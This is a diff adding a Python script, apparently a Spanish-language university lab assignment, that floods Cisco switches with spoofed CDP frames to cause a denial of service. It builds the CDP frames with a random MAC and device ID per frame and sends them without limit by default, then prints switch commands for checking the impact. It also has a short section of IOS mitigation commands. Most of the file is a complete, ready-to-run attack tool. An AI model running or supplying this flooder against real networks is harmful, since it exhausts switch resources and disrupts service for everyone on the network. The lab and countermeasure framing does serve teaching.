@@ -1,0 +1,297 @@
+#!/usr/bin/env python3
+
+import argparse
+import random
+import sys
+import time
+from datetime import datetime
+
+# Verificar que scapy este instalado
+try:
+    from scapy.all import (
+        Ether, LLC, SNAP, sendp, conf
+    )
+    from scapy.layers.l2 import Dot3
+except ImportError:
+    print("[ERROR] Scapy no encontrado. Instalar con: sudo pip3 install scapy")
+    sys.exit(1)
+
+
+# ==============================================================
+# CONSTANTES CDP
+# ==============================================================
+
+CDP_MULTICAST_MAC = "01:00:0c:cc:cc:cc"
+CDP_SNAP_OUI      = b"\x00\x00\x0c"   # Cisco OUI
+CDP_SNAP_PID      = b"\x20\x00"        # CDP PID
+
+# TLV Types CDP relevantes
+CDP_TLV_DEVICE_ID   = b"\x00\x01"
+CDP_TLV_ADDRESS     = b"\x00\x02"
+CDP_TLV_PORT_ID     = b"\x00\x03"
+CDP_TLV_CAPS        = b"\x00\x04"
+CDP_TLV_VERSION     = b"\x00\x05"
+CDP_TLV_PLATFORM    = b"\x00\x06"
+
+
+# ==============================================================
+# FUNCIONES AUXILIARES
+# ==============================================================
+
+def random_mac() -> str:
+    """Genera una MAC aleatoria con el bit unicast local."""
+    mac = [
+        random.randint(0x00, 0xfe) & 0xFE,  # unicast
+        random.randint(0x00, 0xff),
+        random.randint(0x00, 0xff),
+        random.randint(0x00, 0xff),
+        random.randint(0x00, 0xff),
+        random.randint(0x00, 0xff)
+    ]
+    return ":".join(f"{b:02x}" for b in mac)
+
+
+def build_cdp_tlv(tlv_type: bytes, value: bytes) -> bytes:
+    """
+    Construye un TLV CDP:
+      - Type  : 2 bytes
+      - Length: 2 bytes (incluye los 4 bytes del header)
+      - Value : variable
+    """
+    length = len(value) + 4
+    return tlv_type + length.to_bytes(2, "big") + value
+
+
+def build_cdp_payload(device_id: str, port_id: str = "FastEthernet0/1") -> bytes:
+    """
+    Construye el payload CDP completo con los TLVs necesarios.
+    El switch almacenara device_id como un vecino unico.
+    """
+    tlvs = b""
+
+    # TLV: Device ID (identificador unico del "vecino")
+    tlvs += build_cdp_tlv(CDP_TLV_DEVICE_ID, device_id.encode())
+
+    # TLV: Capabilities (Router + Switch)
+    tlvs += build_cdp_tlv(CDP_TLV_CAPS, b"\x00\x00\x00\x29")
+
+    # TLV: Software Version
+    version = b"Cisco IOS Software, Version 15.2(7)E, RELEASE SOFTWARE"
+    tlvs += build_cdp_tlv(CDP_TLV_VERSION, version)
+
+    # TLV: Platform
+    platform = b"cisco WS-C2960-24TC-L"
+    tlvs += build_cdp_tlv(CDP_TLV_PLATFORM, platform)
+
+    # TLV: Port ID
+    tlvs += build_cdp_tlv(CDP_TLV_PORT_ID, port_id.encode())
+
+    # CDP Header: Version(1) + TTL(180s) + Checksum(0 - scapy calcula)
+    cdp_header = b"\x02\xb4\x00\x00"
+
+    return cdp_header + tlvs
+
+
+def build_cdp_packet(src_mac: str, device_id: str) -> bytes:
+    """
+    Construye el paquete Ethernet completo con CDP encapsulado en LLC/SNAP.
+    Estructura: Ethernet 802.3 -> LLC (DSAP/SSAP=0xAA) -> SNAP -> CDP payload
+    """
+    cdp_payload = build_cdp_payload(device_id)
+
+    # Encapsulacion LLC + SNAP
+    llc_snap = (
+        b"\xaa\xaa\x03"          # LLC: DSAP=0xAA, SSAP=0xAA, Control=0x03
+        + CDP_SNAP_OUI            # SNAP OUI Cisco
+        + CDP_SNAP_PID            # SNAP PID = CDP
+        + cdp_payload
+    )
+
+    # Frame Ethernet 802.3 (con campo longitud, no tipo)
+    src_bytes  = bytes(int(x, 16) for x in src_mac.split(":"))
+    dst_bytes  = bytes(int(x, 16) for x in CDP_MULTICAST_MAC.split(":"))
+    length     = len(llc_snap).to_bytes(2, "big")
+    frame      = dst_bytes + src_bytes + length + llc_snap
+
+    # Padding hasta 60 bytes minimo Ethernet
+    if len(frame) < 60:
+        frame += b"\x00" * (60 - len(frame))
+
+    return frame
+
+
+def print_banner(iface: str, count: int, delay: float) -> None:
+    print("=" * 60)
+    print("  ITLA - Practica de Seguridad de la Informacion")
+    print("  Matricula: 20250730")
+    print("  Ataque: DoS mediante CDP (Laboratorio Autorizado)")
+    print("=" * 60)
+    print(f"  Interfaz   : {iface}")
+    print(f"  Paquetes   : {count if count > 0 else 'ilimitados (Ctrl+C para detener)'}")
+    print(f"  Delay      : {delay}s entre paquetes")
+    print(f"  Inicio     : {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")
+    print("=" * 60)
+    print()
+
+
+# ==============================================================
+# FUNCION PRINCIPAL
+# ==============================================================
+
+def cdp_dos_attack(iface: str, count: int, delay: float) -> None:
+    """
+    Ejecuta el ataque DoS CDP enviando paquetes falsificados.
+
+    Args:
+        iface : Interfaz de red (ej: eth0)
+        count : Numero de paquetes a enviar (0 = infinito)
+        delay : Tiempo de espera entre paquetes (segundos)
+    """
+    print_banner(iface, count, delay)
+
+    sent       = 0
+    errors     = 0
+    start_time = time.time()
+
+    print("[*] Iniciando envio de paquetes CDP falsificados...")
+    print("[*] Presiona Ctrl+C para detener\n")
+
+    try:
+        while True:
+            # Generar identidad falsa unica por paquete
+            src_mac   = random_mac()
+            device_id = f"Cisco-CDP-{random.randint(100000, 999999)}"
+
+            try:
+                raw_frame = build_cdp_packet(src_mac, device_id)
+
+                # Scapy - enviar frame raw en la interfaz
+                # conf.L2socket permite enviar frames L2 raw
+                sock = conf.L2socket(iface=iface)
+                sock.send(raw_frame)
+                sock.close()
+                sent += 1
+
+            except Exception as e:
+                errors += 1
+                if errors <= 3:
+                    print(f"[!] Error al enviar paquete: {e}")
+
+            # Progreso cada 100 paquetes
+            if sent % 100 == 0:
+                elapsed = time.time() - start_time
+                pps = sent / elapsed if elapsed > 0 else 0
+                print(f"[+] Paquetes enviados: {sent:6d} | Errores: {errors} | "
+                      f"Velocidad: {pps:.1f} pkt/s | Tiempo: {elapsed:.1f}s")
+
+            # Condicion de parada
+            if count > 0 and sent >= count:
+                break
+
+            if delay > 0:
+                time.sleep(delay)
+
+    except KeyboardInterrupt:
+        print("\n[!] Ataque detenido por el usuario.")
+
+    # Resumen final
+    elapsed = time.time() - start_time
+    print("\n" + "=" * 60)
+    print("  RESUMEN DEL ATAQUE")
+    print("=" * 60)
+    print(f"  Total paquetes enviados : {sent}")
+    print(f"  Errores                 : {errors}")
+    print(f"  Tiempo total            : {elapsed:.2f} segundos")
+    print(f"  Promedio                : {sent/elapsed:.1f} paquetes/seg")
+    print("=" * 60)
+    print("\n[INFO] Verificar en el switch:")
+    print("  Switch# show cdp neighbors")
+    print("  Switch# show processes memory | include CDP")
+    print("  Switch# show processes cpu sorted")
+
+
+# ==============================================================
+# CONTRAMEDIDA (funcion de referencia)
+# ==============================================================
+
+def print_contramedida() -> None:
+    """Imprime los comandos de mitigacion recomendados."""
+    print("\n" + "=" * 60)
+    print("  CONTRAMEDIDA - Comandos IOS para mitigar CDP DoS")
+    print("=" * 60)
+    print("""
+  ! Deshabilitar CDP en puertos de acceso (usuarios):
+  Switch(config)# interface range FastEthernet0/1 - 24
+  Switch(config-if-range)# no cdp enable
+  Switch(config-if-range)# exit
+
+  ! Mantener CDP solo en uplinks de infraestructura:
+  Switch(config)# interface GigabitEthernet0/1
+  Switch(config-if)# cdp enable
+
+  ! Verificar estado CDP por interfaz:
+  Switch# show cdp interface
+  Switch# show cdp neighbors
+
+  ! Limpiar tabla CDP manualmente:
+  Switch# clear cdp table
+""")
+
+
+# ==============================================================
+# ENTRY POINT
+# ==============================================================
+
+if __name__ == "__main__":
+    parser = argparse.ArgumentParser(
+        description="DoS CDP - Practica Academica ITLA (Matricula: 20250730)",
+        formatter_class=argparse.RawDescriptionHelpFormatter,
+        epilog="""
+Ejemplos:
+  sudo python3 cdp_dos.py -i eth0
+  sudo python3 cdp_dos.py -i eth0 -c 500 -d 0.01
+  sudo python3 cdp_dos.py -i eth0 --contramedida
+        """
+    )
+    parser.add_argument(
+        "-i", "--interface",
+        required=False,
+        default="eth0",
+        help="Interfaz de red a usar (default: eth0)"
+    )
+    parser.add_argument(
+        "-c", "--count",
+        type=int,
+        default=0,
+        help="Numero de paquetes a enviar (default: 0 = ilimitado)"
+    )
+    parser.add_argument(
+        "-d", "--delay",
+        type=float,
+        default=0.001,
+        help="Delay en segundos entre paquetes (default: 0.001)"
+    )
+    parser.add_argument(
+        "--contramedida",
+        action="store_true",
+        help="Mostrar comandos de contramedida en lugar de atacar"
+    )
+
+    args = parser.parse_args()
+
+    # Advertencia academica
+    print("\n[AVISO] Este script es exclusivamente para uso academico")
+    print("[AVISO] en entornos de laboratorio controlados y autorizados.\n")
+
+    if args.contramedida:
+        print_contramedida()
+        sys.exit(0)
+
+    # Verificar privilegios root
+    import os
+    if os.geteuid() != 0:
+        print("[ERROR] Este script requiere privilegios de root.")
+        print("        Ejecutar con: sudo python3 cdp_dos.py -i eth0")
+        sys.exit(1)
+
+    cdp_dos_attack(args.interface, args.count, args.delay)
